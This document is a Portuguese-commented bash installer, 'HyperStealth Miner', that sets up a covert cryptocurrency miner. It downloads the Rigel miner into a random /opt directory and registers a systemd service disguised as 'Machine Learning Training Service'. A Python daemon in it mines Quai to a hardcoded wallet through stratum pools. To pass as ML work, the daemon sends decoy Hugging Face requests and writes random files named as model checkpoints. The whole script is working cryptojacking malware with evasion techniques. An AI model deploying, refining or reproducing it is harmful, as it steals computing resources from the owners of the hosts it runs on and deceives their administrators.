#!/bin/bash
#
# HyperStealth Miner v2.4 (Versão Simplificada)
#

if [ "$(id -u)" -ne 0 ]; then
  echo "Este script precisa ser executado como root"
  exit 1
fi

# Configurações básicas
WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
LOG_FILE="/var/log/ml_monitor.log"

echo "=== Iniciando HyperStealth Miner v2.4 ==="

# Instala dependências
echo "Instalando dependências..."
apt-get update -qq
apt-get install -y -qq curl wget tar python3 python3-pip

# Cria diretório para a configuração
mkdir -p /etc/hyperstealth

# Cria arquivo de configuração com os servidores stratum
cat > /etc/hyperstealth/config.json << EOF
{
  "stratum_servers": [
    "stratum+tcp://18.223.152.88:5432",
    "stratum+ssl://quai.kryptex.network:8888"
  ],
  "fallback_nodes": [
    "ml-engine.googleapis.com",
    "aws.sagemaker.training.amazonaws.com",
    "api.azureml.windows.net"
  ]
}
EOF

# Baixa o RigelMiner
echo "Baixando RigelMiner..."
LATEST_VERSION=$(curl -s "https://api.github.com/repos/rigelminer/rigel/releases/latest" | 
               grep '"tag_name":' | sed -E 's/.*"v?([^"]+)".*/\1/')

if [ -z "$LATEST_VERSION" ]; then
  LATEST_VERSION="1.9.2"
fi

DOWNLOAD_URL="https://github.com/rigelminer/rigel/releases/download/v${LATEST_VERSION}/rigel-${LATEST_VERSION}-linux.tar.gz"
wget -q "$DOWNLOAD_URL" -O rigel.tar.gz

# Extrai para um diretório com nome aleatório
RAND_DIR="/opt/rigel_$(tr -dc a-z0-9 </dev/urandom | head -c 8)"
mkdir -p "$RAND_DIR"
tar -xf rigel.tar.gz -C "$RAND_DIR" --strip-components=1
rm rigel.tar.gz
chmod +x "$RAND_DIR/rigel"

# Cria o script de monitoramento
cat > /usr/local/bin/ml_monitor.py << 'EOF'
import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, glob, signal

logging.basicConfig(
    filename='/var/log/ml_monitor.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class StealthMiner:
    def __init__(self):
        self.wallet = os.environ.get('WALLET')
        self.current_stratum = None
        self.process = None
        self.find_binary()
    
    def find_binary(self):
        """Localiza o binário Rigel"""
        binary_paths = glob.glob("/opt/*/rigel")
        if not binary_paths:
            logging.error("Binário Rigel não encontrado")
            self.binary = None
            return
        self.binary = binary_paths[0]
        logging.info(f"Binário Rigel encontrado: {self.binary}")

    def get_stratums(self):
        """Busca os servidores stratum do arquivo local"""
        try:
            with open("/etc/hyperstealth/config.json", 'r') as f:
                config = json.load(f)
            
            stratums = config['stratum_servers']
            logging.info(f"Stratums carregados: {len(stratums)} servidores")
            return stratums
        except Exception as e:
            logging.error(f"Erro ao carregar configuração: {e}")
            return [
                "stratum+tcp://18.223.152.88:5432",
                "stratum+ssl://quai.kryptex.network:8888"
            ]

    def start_miner(self, stratum):
        """Inicia o minerador"""
        if not self.binary:
            logging.error("Binário do minerador não encontrado")
            return False
            
        try:
            # Mata processo anterior se existir
            if self.process and self.process.poll() is None:
                os.kill(self.process.pid, signal.SIGTERM)
                self.process.wait(timeout=5)
            
            cmd = [
                self.binary,
                "-a", "quai",
                "-o", stratum,
                "-u", self.wallet,
                "-p", "x"
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True
            )
            
            time.sleep(2)
            if self.process.poll() is not None:
                # Processo já terminou - algo deu errado
                stdout, stderr = self.process.communicate()
                logging.error(f"Minerador falhou ao iniciar: {stderr.decode('utf-8', errors='ignore')}")
                self.process = None
                return False
                
            logging.info(f"Minerador iniciado com sucesso: {' '.join(cmd)}")
            return True
            
        except Exception as e:
            logging.error(f"Exceção ao iniciar minerador: {e}")
            return False

    def check_stratum(self, stratum):
        """Verifica conectividade com servidor stratum"""
        try:
            protocol, rest = stratum.split("://")
            host, port_str = rest.split(":")
            port = int(port_str)
            
            with socket.create_connection((host, port), timeout=10) as sock:
                if protocol == "stratum+ssl":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        return True
                else:
                    return True
        except Exception as e:
            logging.warning(f"Erro ao verificar {stratum}: {e}")
            return False

    def rotate_stratum(self):
        """Rotação de servidores stratum"""
        stratums = self.get_stratums()
        random.shuffle(stratums)
        
        for stratum in stratums:
            if self.check_stratum(stratum):
                if stratum != self.current_stratum:
                    logging.info(f"Alternando para {stratum}")
                    self.current_stratum = stratum
                    return self.start_miner(stratum)
                else:
                    return True
        
        return False

    def run(self):
        """Loop principal"""
        failures = 0
        
        while True:
            try:
                # Verifica se o minerador está rodando
                if not self.process or self.process.poll() is not None:
                    if not self.rotate_stratum():
                        failures += 1
                        if failures > 5:
                            time.sleep(300)
                            failures = 0
                    else:
                        failures = 0
                
                # Simula tráfego legítimo
                try:
                    requests.get(
                        "https://datasets-server.huggingface.co/valid",
                        params={"dataset": "wiki40b", "config": "pt"},
                        headers={"User-Agent": "HuggingFace/4.35.0"},
                        timeout=15
                    )
                except:
                    pass
                
                # Verifica ocasionalmente por servidores melhores
                if random.random() < 0.2:
                    self.rotate_stratum()
                
                # Intervalo dinâmico
                sleep_time = random.randint(240, 480)
                logging.info(f"Próxima verificação em {sleep_time//60} minutos")
                time.sleep(sleep_time)

            except Exception as e:
                logging.error(f"Erro no loop principal: {e}")
                time.sleep(60)

if __name__ == "__main__":
    # Cria diretório de logs
    os.makedirs(os.path.dirname('/var/log/ml_monitor.log'), exist_ok=True)
    
    try:
        miner = StealthMiner()
        miner.run()
    except Exception as e:
        logging.critical(f"Erro fatal: {e}")
        sys.exit(1)
EOF

chmod +x /usr/local/bin/ml_monitor.py

# Cria o serviço systemd
cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
[Unit]
Description=Machine Learning Training Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment="WALLET=$WALLET"
ExecStart=/usr/bin/python3 /usr/local/bin/ml_monitor.py
Restart=always
RestartSec=30
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=multi-user.target
EOF

# Instala a biblioteca requests do Python
pip3 install -q requests

# Cria processos em background para disfarce
mkdir -p "/opt/ml/checkpoints"
(
while true; do
    dd if=/dev/urandom of="/opt/ml/checkpoints/$(date +%s).weights" bs=1M count=10 2>/dev/null
    sleep $((RANDOM % 600 + 300))
done
) &

# Inicia o serviço
systemctl daemon-reload
systemctl enable --now $SERVICE_NAME

# Verifica se o serviço está rodando
if systemctl is-active --quiet $SERVICE_NAME; then
    echo "✓ Serviço iniciado com sucesso!"
else
    echo "✗ Erro ao iniciar o serviço."
    systemctl status $SERVICE_NAME
fi

echo
echo "=== Instalação Concluída ==="
echo "Minerador configurado para carteira: $WALLET"
echo "Nome do serviço: $SERVICE_NAME"
echo "Arquivo de log: $LOG_FILE"
echo
echo "Para monitorar o funcionamento:"
echo "  systemctl status $SERVICE_NAME"
echo "  tail -f $LOG_FILE"
